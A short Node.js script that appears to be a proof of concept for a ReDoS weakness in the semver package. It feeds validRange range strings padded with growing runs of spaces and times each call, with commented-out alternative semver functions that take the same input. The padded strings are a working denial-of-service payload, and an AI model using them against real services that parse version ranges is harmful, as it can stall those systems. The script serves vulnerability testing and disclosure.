const semver = require('semver');

const lengths_2 = [2000, 4000, 8000, 16000, 32000, 64000, 128000];
console.log("n[+] Valid range - Test payloads");
for (let i = 0; i < 5; i++){
  let value ='1.2.3' + ' '.repeat(lengths_2[i]) + '<1.3.0';
  const start = Date.now();
  semver.validRange(value);
  // semver.minVersion(value)
  // semver.maxSatisfying(["1.2.3"], value)
  // semver.minSatisfying(["1.2.3"], value)
  // new semver.Range(value, {})
  const end = Date.now();
  console.log('length=%d, time=%d ms', value.length, end - start);
}
